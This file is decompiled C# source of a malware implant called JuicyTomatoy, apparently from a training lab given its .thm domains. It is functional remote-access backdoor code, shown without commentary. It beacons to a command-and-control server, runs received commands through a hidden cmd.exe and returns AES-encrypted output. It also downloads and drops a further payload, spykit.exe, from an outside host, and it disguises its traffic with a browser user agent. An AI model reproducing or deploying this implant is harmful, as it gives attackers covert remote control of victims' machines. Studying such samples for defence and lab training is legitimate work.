using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace JuicyTomatoy
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
		private static void Main(string[] args)
		{
			string hostName = Dns.GetHostName();
			string str = "http://mcgreedysecretc2.thm";
			string url = str + "/reg";
			string data = "name=" + hostName;
			string str2 = Program.PostIt(url, data);
			int count = 15000;
			bool flag = false;
			for (; ; )
			{
				Program.Sleeper(count);
				string url2 = str + "/tasks/" + str2;
				string url3 = str + "/results/" + str2;
				string it = Program.GetIt(url2);
				if (!string.IsNullOrEmpty(it))
				{
					string[] array = Program.Decryptor(it).Split(new char[]
					{
						' '
					});
					string a = array[0];
					string text = "";
					if (array.Length > 1)
					{
						text = string.Join(" ", array.Skip(1).ToArray<string>());
					}
					if (!(a == "sleep"))
					{
						if (!(a == "shell"))
						{
							if (!(a == "implant"))
							{
								if (a == "quit")
								{
									flag = true;
								}
							}
							else
							{
								string text2 = Program.Implant("http://stash.mcgreedy.thm/spykit.exe");
								if (!string.IsNullOrEmpty(text2))
								{
									string str3 = Program.Encryptor(text2);
									string data2 = "result=" + str3;
									Program.PostIt(url3, data2);
								}
							}
						}
						else
						{
							string str4 = Program.Encryptor(Program.ExecuteCommand(text));
							string data3 = "result=" + str4;
							Program.PostIt(url3, data3);
						}
					}
					else
					{
						count = int.Parse(text) * 1000;
					}
					if (flag)
					{
						break;
					}
				}
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000021BC File Offset: 0x000003BC
		public static string Implant(string url)
		{
			byte[] bytes = Convert.FromBase64String(Program.GetIt(url));
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\spykit.exe";
			File.WriteAllBytes(text, bytes);
			if (File.Exists(text))
			{
				return text;
			}
			return "";
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000021FD File Offset: 0x000003FD
		public static void Sleeper(int count)
		{
			Thread.Sleep(count);
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002208 File Offset: 0x00000408
		private static string Encryptor(string plaintext)
		{
			byte[] bytes = Encoding.ASCII.GetBytes("youcanthackthissupersecurec2keys");
			byte[] rgbIV = new byte[]
			{
				9,
				178,
				251,
				121,
				16,
				203,
				49,
				218,
				17,
				5,
				243,
				70,
				230,
				214,
				12,
				216
			};
			byte[] inArray;
			using (AesManaged aesManaged = new AesManaged())
			{
				aesManaged.Mode = CipherMode.CBC;
				aesManaged.Padding = PaddingMode.Zeros;
				aesManaged.BlockSize = 128;
				aesManaged.KeySize = 256;
				ICryptoTransform transform = aesManaged.CreateEncryptor(bytes, rgbIV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plaintext);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002304 File Offset: 0x00000504
		private static string Decryptor(string encoded)
		{
			byte[] buffer = Convert.FromBase64String(encoded);
			byte[] bytes = Encoding.UTF8.GetBytes("youcanthackthissupersecurec2keys");
			byte[] rgbIV = new byte[]
			{
				9,
				178,
				251,
				121,
				16,
				203,
				49,
				218,
				17,
				5,
				243,
				70,
				230,
				214,
				12,
				216
			};
			string result = null;
			using (AesManaged aesManaged = new AesManaged())
			{
				aesManaged.Mode = CipherMode.CBC;
				aesManaged.Padding = PaddingMode.Zeros;
				aesManaged.BlockSize = 128;
				aesManaged.KeySize = 256;
				ICryptoTransform transform = aesManaged.CreateDecryptor(bytes, rgbIV);
				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader(cryptoStream))
						{
							result = streamReader.ReadToEnd().Trim(new char[1]);
						}
					}
				}
			}
			return result;
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002410 File Offset: 0x00000610
		public static string ExecuteCommand(string command)
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = "cmd.exe",
				Arguments = "/C " + command
			};
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.Start();
			process.WaitForExit();
			return process.StandardOutput.ReadToEnd();
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002481 File Offset: 0x00000681
		public static string GetIt(string url)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
			return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000024B4 File Offset: 0x000006B4
		public static string PostIt(string url, string data)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			byte[] bytes = Encoding.ASCII.GetBytes(data);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = (long)bytes.Length;
			httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
			using (Stream requestStream = httpWebRequest.GetRequestStream())
			{
				requestStream.Write(bytes, 0, bytes.Length);
			}
			return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
		}
	}
}
